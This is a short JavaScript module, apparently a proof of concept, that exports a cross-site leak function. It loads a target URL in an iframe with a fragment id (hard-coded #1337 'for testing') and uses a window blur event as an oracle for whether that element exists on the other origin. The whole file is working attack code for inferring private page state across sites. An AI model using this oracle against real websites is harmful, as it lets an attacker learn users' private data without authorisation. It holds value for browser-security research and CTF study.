const leak = async (url) => {
    return new Promise(r => {
        let iframe = document.createElement('iframe')

        // we lost focus so id matches
        window.onblur = async () => {
            console.debug('onblur fired')
            window.onblur = ''
            // we need to wait so chrome dosnt crash when removing the iframe
            await sleep(10)
            iframe.remove()
            return r(1)
        }

        // no match
        setTimeout(() => {
            window.onblur = ''
            iframe.remove()
            return r(0)
        }, 1500)



        // hard coded id for testing
        iframe.src = `${url}#1337`

        document.body.appendChild(iframe)
    })
}

const sleep = (ms) => {
    // call with await sleep(1000)
    return new Promise(resolve => setTimeout(resolve, ms));
}


export { leak }